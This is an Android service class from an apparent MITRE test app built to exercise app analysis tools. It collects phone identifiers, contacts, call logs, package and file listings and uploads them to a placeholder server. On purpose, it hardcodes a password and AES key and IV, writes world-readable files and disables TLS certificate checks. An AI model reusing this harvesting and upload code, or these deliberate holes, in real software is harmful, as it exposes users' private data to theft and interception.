/*
 * Copyright 2017 The MITRE Corporation
 * Approved for Public Release; Distribution Unlimited. Case Number 17-0137.
 
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.

 * NOTICE
 * This software was produced for the U.S. Government under Basic Contract
 * No. W15P7T-13-C-A802, and is subject to the Rights in Noncommercial
 * Computer Software and Noncommercial Computer Software Documentation
 * Clause 252.227-7014 (FEB 2012)
 */

package com.example.uploaddataapp;

import android.Manifest;
import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import org.apache.http.conn.ssl.AllowAllHostnameVerifier;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.InterfaceAddress;
import java.net.MalformedURLException;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.URL;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.util.Enumeration;
import java.util.List;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import pub.devrel.easypermissions.EasyPermissions;

/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p/>
 * TODO: Customize class - update intent actions, extra parameters and static
 * helper methods.
 */
public class SendIntentService extends IntentService {
    // Demonstrate vulnerable password embedded in app code, used for http auth, and saved to
    // both internal and external storage.
    private static final String password = "s3cr3t";

    private static String SERVER_UPLOAD_URL = "https://127.0.0.1/"; // Insert server hostname

    private static final byte[] NOT_SO_SECRET_AES_KEY = {
            (byte) 0x00,
            (byte) 0x01,
            (byte) 0x02,
            (byte) 0x03,
            (byte) 0x04,
            (byte) 0x05,
            (byte) 0x06,
            (byte) 0x07,
            (byte) 0x08,
            (byte) 0x09,
            (byte) 0x0A,
            (byte) 0x0B,
            (byte) 0x0C,
            (byte) 0x0D,
            (byte) 0x0E,
            (byte) 0x0F };

    private static final byte[] NOT_SO_RANDOM_IV = {
            (byte) 0x00,
            (byte) 0x01,
            (byte) 0x02,
            (byte) 0x03,
            (byte) 0x04,
            (byte) 0x05,
            (byte) 0x06,
            (byte) 0x07,
            (byte) 0x08,
            (byte) 0x09,
            (byte) 0x0A,
            (byte) 0x0B,
            (byte) 0x0C,
            (byte) 0x0D,
            (byte) 0x0E,
            (byte) 0x0F };

    public SendIntentService() {
        super("SendIntentService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        Log.d("SendIntentService", "Handling intent");
        String arch = System.getProperty("os.arch");

        String adb = Settings.Secure.getString(getContentResolver(), Settings.Secure.ADB_ENABLED);
        String android_id = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        String non_market = Settings.Secure.getString(getContentResolver(), Settings.Secure.INSTALL_NON_MARKET_APPS);
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String imsi = "";
        String imei = "";
        String number = "";

        String[] perms = { Manifest.permission.READ_PHONE_STATE };

        if(tm != null) {
            if (EasyPermissions.hasPermissions(this, perms)) {
                imsi = tm.getSubscriberId(); // Android M+: Requires runtime permission android.permission.READ_PHONE_STATE
                imei = tm.getDeviceId(); // Android M+: Requires runtime permission android.permission.READ_PHONE_STATE
                number = tm.getLine1Number(); // Android M+: Requires runtime permission android.permission.READ_PHONE_STATE
            } else {
                Log.d("SendIntentService", "Does not hold permission READ_PHONE_STATE");
            }
        }

        if((android_id == null) || (android_id.equals(""))) {
            android_id = "no_android_id";
        }

        JSONObject jo_settings = new JSONObject();
        try {
            jo_settings.put("arch", arch);
            jo_settings.put("ADB", adb);
            jo_settings.put("android_id", android_id);
            jo_settings.put("allow_non_market_apps", non_market);
            jo_settings.put("imsi", imsi);
            jo_settings.put("imei", imei);
            jo_settings.put("number", number);
            jo_settings.put("ip_addresses", getIpAddresses());
        } catch (JSONException e1) {

        }

        JSONArray ja_pkgs = new JSONArray();
        PackageManager pkgm = getPackageManager();
        List<PackageInfo> pkgs = pkgm.getInstalledPackages(0);
        for(int i = 0; i < pkgs.size(); i++) {
            PackageInfo pi = pkgs.get(i);
            JSONObject ja_pkginfo = new JSONObject();

            try {
                ja_pkginfo.put("name", pi.packageName);
                ja_pkgs.put(ja_pkginfo);
            } catch (JSONException e) {
                e.printStackTrace();
            }

        }
        Uri uri = ContactsContract.Contacts.CONTENT_URI;
        String[] projection = new String[]{
                      ContactsContract.Contacts._ID,
                      ContactsContract.Contacts.DISPLAY_NAME,
                      ContactsContract.Contacts.HAS_PHONE_NUMBER
        };
        Cursor cursor1;
        String[] selectionArgs = null;

        JSONArray ja1 = new JSONArray();
        final String[] READ_CONTACTS = { Manifest.permission.READ_CONTACTS };
        if (EasyPermissions.hasPermissions(this, READ_CONTACTS)) {
            cursor1 = getContentResolver().query(uri, null, null, selectionArgs, null);
            int contactsCount = 0;

            if (cursor1.moveToFirst() && contactsCount < 50) {
                do {
                    contactsCount++;
                    String id = cursor1.getString(cursor1.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cursor1.getString(cursor1.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    String phone = "";
                    String has_phone = cursor1.getString(cursor1.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
                    if (has_phone.equals("1")) {
                        String[] projection2 = new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER};

                        Cursor cursor2 = getContentResolver().query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                projection2,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id}, null);
                        if (cursor2.moveToFirst())
                            phone = cursor2.getString(cursor2.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        cursor2.close();
                    }

                    try {
                        JSONObject jo2 = new JSONObject();
                        jo2.put("id", id);
                        jo2.put("name", name);
                        jo2.put("phone", phone);
                        ja1.put(jo2);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                } while (cursor1.moveToNext());
            }
        } else {
            Log.d("SendIntentService", "Does not have permission READ_CONTACTS");
        }
        Log.d("SendIntentService", ja1.toString());

        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        JSONArray ja2 = new JSONArray();
        final String[] READ_CALL_LOG = { Manifest.permission.READ_CALL_LOG } ;

        if (EasyPermissions.hasPermissions(this, READ_CALL_LOG)) {
            Cursor cursor3;
            cursor3 = getContentResolver().query(callLogUri, null, null, selectionArgs, null);
            if (cursor3.moveToFirst()) {
                do {
                    JSONObject jo3 = new JSONObject();
                    String[] columnNames = cursor3.getColumnNames();
                    for (int i = 0; i < columnNames.length; i++) {
                        String value = cursor3.getString(cursor3.getColumnIndex(columnNames[i]));
                        try {
                            jo3.put(columnNames[i], value);
                        } catch (JSONException e) {
                            // TODO Auto-generated catch block
                            e.printStackTrace();
                        }
                    }
                    ja2.put(jo3);
                } while (cursor3.moveToNext());
                cursor3.close();
            }
        } else {
            Log.d("SendIntentService", "Does not have permission READ_CALL_LOG");
        }

        Log.d("SendIntentService2", ja2.toString());
        String filetext = "";
        String READ_EXTERNAL_STORAGE[] = { Manifest.permission.READ_EXTERNAL_STORAGE };
        if (EasyPermissions.hasPermissions(this, READ_EXTERNAL_STORAGE)) {
            try {
                List<File> files = com.example.uploaddataapp.ListFiles.getFileListing(Environment.getExternalStorageDirectory());
                filetext = "Files " + this.fileList2JSON(files) + "\n";
            } catch (FileNotFoundException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (IllegalArgumentException e) {
                e.printStackTrace();
            }
        }
        else {
            Log.d("SendIntentService", "Does not hold permission READ_EXTERNAL_STORAGE");
        }

        String dataToSend = "Settings " + jo_settings.toString() + "\n" + "Contacts " + ja1.toString() + "\n" + "Calls " + ja2.toString() + "\n" +
                "Packages " + ja_pkgs.toString() + "\n" + filetext;

        // Demonstrate app vulnerabilities by writing out this data to internal storage with readable/writable file permissions
        // and write to external storage.
        try {
            FileOutputStream fos = openFileOutput(Long.toString(System.currentTimeMillis()), MODE_WORLD_READABLE | MODE_WORLD_WRITEABLE);
            fos.write(dataToSend.getBytes());
            fos.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

        try {
            String state = Environment.getExternalStorageState();
            if (Environment.MEDIA_MOUNTED.equals(state)) {
                //File file = new File(Environment.getExternalStoragePublicDirectory(
                //Environment.DIRECTORY_DOCUMENTS), Long.toString(System.currentTimeMillis()));
                File file = new File("/sdcard/" + Long.toString(System.currentTimeMillis()));
                Log.d("SendIntentService", "File writing at: " + file.getAbsolutePath());
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(dataToSend.getBytes());
                fos.close();
            } else {
                Log.d("SendIntentService", "External storage not mounted");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

        // Store poorly encrypted copy of data
        // Deliberate Weaknesses:
        // AES key is not random. AES-CBC IV is predictable.
        // AES key and IV are embedded in app code.
        // AES-CBC is used without authentication (a MAC).
        //
        // Additionally, the password string is written to both external storage and internal storage.
        // This enables testing of whether app analysis tools can determine when sensitive values are written
        // to storage without extra protection. Such a feature in an app analysis tool would probably require
        // the ability to taint specific values (e.g. "s3cr3t" in this case).
        byte[] aesOutput;
        try {
            SecretKeySpec secretKeySpec = new SecretKeySpec(NOT_SO_SECRET_AES_KEY, "AES");
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec, new IvParameterSpec(NOT_SO_RANDOM_IV));
            aesOutput = cipher.doFinal(dataToSend.getBytes());
            //"/sdcard/encrypted"
            File file = new File("/sdcard/encrypted" + Long.toString(System.currentTimeMillis()));
            Log.d("SendIntentService", "File writing at: " + file.getAbsolutePath());
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(aesOutput);
            fos.close();
            sendStuff("dataencrypted_" + android_id, Base64.encodeToString(aesOutput, Base64.DEFAULT));

            String state = Environment.getExternalStorageState();
            if (Environment.MEDIA_MOUNTED.equals(state)) {
                File file2 = new File("/sdcard/password" + Long.toString(System.currentTimeMillis()));
                Log.d("SendIntentService", "File writing at: " + file2.getAbsolutePath());
                FileOutputStream fos2 = new FileOutputStream(file2);
                fos2.write(password.getBytes());
                fos2.close();
            } else {
                Log.d("SendIntentService", "External storage not mounted");
            }

            FileOutputStream fos3 = openFileOutput("password" + Long.toString(System.currentTimeMillis()), MODE_PRIVATE);
            fos3.write(password.getBytes());
            fos3.close();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InvalidKeyException e) {
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        } catch (InvalidAlgorithmParameterException e) {
            e.printStackTrace();
        } catch (IllegalBlockSizeException e) {
            e.printStackTrace();
        } catch (BadPaddingException e) {
            e.printStackTrace();
        }

        // Send captured data over the network to server
        sendStuff("data_" + android_id, dataToSend);

        //Send a small amount of data to the network unsecurely
        //sendStuffHTTP("data_" + android_id, "just some data sent over a non-secure line");
        String original_server = SERVER_UPLOAD_URL;
        SERVER_UPLOAD_URL = SERVER_UPLOAD_URL.replace("https", "http");
        sendStuff("data_unsecure_" + android_id, "just some data sent over a non-secure line");
        SERVER_UPLOAD_URL = original_server;

    }

    public String getIpAddresses() {
        Enumeration<NetworkInterface> netifs = null;
        try {
            netifs = NetworkInterface.getNetworkInterfaces();
        } catch (SocketException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        String output = "";

        while (netifs.hasMoreElements()) {
            NetworkInterface netif = netifs.nextElement();
            List<InterfaceAddress> addrs = netif.getInterfaceAddresses();
            for (int i = 0; i < addrs.size(); i++) {
                String addr = addrs.get(i).getAddress().toString();
                output += addr + "+";
            }

        }
        return output;
    }

    public JSONArray fileList2JSON (List<File> pkgs){
        JSONArray ja_pkgs = new JSONArray();

        for(int i = 0; i < pkgs.size(); i++) {
            //PackageInfo pi = pkgs.get(i);
            JSONObject ja_pkginfo = new JSONObject();

            try {
                ja_pkginfo.put("name", pkgs.get(i).toString());
                ja_pkgs.put(ja_pkginfo);
            } catch (JSONException e) {
                // TODO Auto-generated catch block
                //e.printStackTrace();
            }

        }
        return ja_pkgs;
    }

    public static void sendStuff(String id, String stuff) {
        // Deliberately disable TLS certificate validation
        TrustManager[] trustAllCerts = new TrustManager[]{
                new X509TrustManager() {
                    public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                        return null;
                    }
                    public void checkClientTrusted(
                            java.security.cert.X509Certificate[] certs, String authType) {
                    }
                    public void checkServerTrusted(
                            java.security.cert.X509Certificate[] certs, String authType) {
                    }
                }
        };
        Log.d("SendIntentService", "stuff: " + stuff);


        try {
            OutputStreamWriter out;
            URL url = new URL(SERVER_UPLOAD_URL + id); // + id
            Log.d("SendIntentService", "sendstuff http start URL " + url.toString());

            // adapted from http://stackoverflow.com/questions/7019997/preemptive-basic-auth-with-httpurlconnection
            String httpAuthString = "user" + ":" + password;
            byte[] bytesEncoded = Base64.encode(httpAuthString.getBytes(), Base64.NO_WRAP);
            String authEncoded = new String(bytesEncoded);


            if(url.getProtocol().equals("https")) {
                // Demonstrates use of vulnerable https (no certificate validation is performed,
                // and no hostname checking is performed)
                SSLContext context = SSLContext.getInstance("TLS");
                context.init(null, trustAllCerts, null);
                HttpsURLConnection httpCon = (HttpsURLConnection) url.openConnection();
                // Deliberately disable https hostname checking
                httpCon.setHostnameVerifier(new AllowAllHostnameVerifier());
                httpCon.setSSLSocketFactory(context.getSocketFactory());
                httpCon.setDoOutput(true);
                httpCon.setRequestMethod("PUT");
                httpCon.setRequestProperty("Authorization", "Basic "+authEncoded);
                //httpCon.connect();
                out = new OutputStreamWriter(httpCon.getOutputStream());
                out.write(stuff);
                out.close();
                BufferedReader in = new BufferedReader(new InputStreamReader(httpCon.getInputStream()));
                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                    Log.d("SendIntentService", "inputLine: " + inputLine);
                }
                in.close();
                //httpCon.disconnect();
                //Log.d("SendIntentService", "http done" + httpCon.getResponseCode());

            } else if(url.getProtocol().equals("http")) {
                // Demonstrate use of plaintext http (insecure network transmission)


                HttpURLConnection httpCon = (HttpURLConnection) url.openConnection();
                //httpCon.setDoInput(false);
                httpCon.setDoOutput(true);
                httpCon.setRequestMethod("PUT");
                httpCon.setRequestProperty("Authorization", "Basic "+authEncoded);
               // httpCon.connect();


                out = new OutputStreamWriter(httpCon.getOutputStream());
                out.write(stuff);
                out.close();
                BufferedReader in = new BufferedReader(new InputStreamReader(httpCon.getInputStream()));
                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                   Log.d("SendIntentService", "inputLine: " + inputLine);
                }
                in.close();
                //httpCon.disconnect();
                //Log.d("SendIntentService", "http done" + httpCon.getResponseCode());
            }

//HttpURLConnection httpCon = (HttpURLConnection) url.openConnection();


            //HttpURLConnection httpCon = new HttpURLConnection(url);

        } catch (MalformedURLException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (KeyManagementException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }


    }

    /*
    public static void sendStuffHTTP(String id, String stuff) {

        Log.d("SendIntentService", "stuffHTTP: " + stuff);
        // Demonstrate vulnerable password embedded in app code and used for http auth
        final String password = "s3cr3t";

        // adapted from http://stackoverflow.com/questions/7019997/preemptive-basic-auth-with-httpurlconnection
        String httpAuthString = "user" + ":" + password;
        byte[] bytesEncoded = Base64.encode(httpAuthString.getBytes(), Base64.DEFAULT);
        String authEncoded = new String(bytesEncoded);

        try {
            OutputStreamWriter out;
            URL url = new URL(SERVER_UPLOAD_URL_HTTP + id); // + id
            Log.d("SendIntentService", "sendstuffhttp http start URL " + url.toString());
            HttpURLConnection httpCon = (HttpURLConnection) url.openConnection();
            //httpCon.setDoInput(false);
            httpCon.setDoOutput(true);

            httpCon.setRequestMethod("PUT");

            httpCon.setRequestProperty("Authorization", "Basic " + authEncoded);
            // httpCon.connect();


            out = new OutputStreamWriter(httpCon.getOutputStream());

            out.write(stuff);
            out.close();
            BufferedReader in = new BufferedReader(new InputStreamReader(httpCon.getInputStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                Log.d("SendIntentService", "inputLine: " + inputLine);
            }
            in.close();
        } catch (MalformedURLException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }


    }
    */

    public static void sendFile(String id, FileInputStream fis) {
        //defaultURL = getString(R.string.defaultURL);
        String defaultURL = SERVER_UPLOAD_URL + id;
        // Deliberately disable TLS certificate validation
        TrustManager[] trustAllCerts = new TrustManager[]{
                new X509TrustManager() {
                    public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                        return null;
                    }
                    public void checkClientTrusted(
                            java.security.cert.X509Certificate[] certs, String authType) {
                    }
                    public void checkServerTrusted(
                            java.security.cert.X509Certificate[] certs, String authType) {
                    }
                }
        };

        Log.d("SendIntentService", "http start");
        try {
            OutputStream out;
            URL url = new URL(defaultURL);

            if(url.getProtocol().equals("https")) {
                SSLContext context = SSLContext.getInstance("TLS");
                context.init(null, trustAllCerts, null);
                HttpsURLConnection httpCon = (HttpsURLConnection) url.openConnection();
                // Deliberately disable https hostname checking
                httpCon.setHostnameVerifier(new AllowAllHostnameVerifier());
                httpCon.setSSLSocketFactory(context.getSocketFactory());
                httpCon.setDoOutput(true);
                httpCon.setRequestMethod("PUT");
                //httpCon.connect();

                out = httpCon.getOutputStream();
                if(fis == null) return;
                int c;
                while((c = fis.read()) != -1) {
                    out.write(c);
                }
                fis.close();
                out.close();
                BufferedReader in = new BufferedReader(new InputStreamReader(httpCon.getInputStream()));
                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                    Log.d("SendIntentService", "inputLine: " + inputLine);
                }
                in.close();
                //httpCon.disconnect();
                Log.d("SendIntentService", "http done" + httpCon.getResponseCode());
            } else {
                HttpURLConnection httpCon = (HttpURLConnection) url.openConnection();
                httpCon.setDoOutput(true);
                httpCon.setRequestMethod("PUT");

                //httpCon.connect();

                out = httpCon.getOutputStream();
                if(fis == null) return;
                int c;
                while((c = fis.read()) != -1) {
                    out.write(c);
                }
                fis.close();
                out.close();
                //httpCon.disconnect();
                BufferedReader in = new BufferedReader(new InputStreamReader(httpCon.getInputStream()));
                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                    Log.d("SendIntentService", "inputLine: " + inputLine);
                }
                in.close();
                Log.d("SendIntentService", "http done" + httpCon.getResponseCode());
            }
        } catch (MalformedURLException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (KeyManagementException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }
}
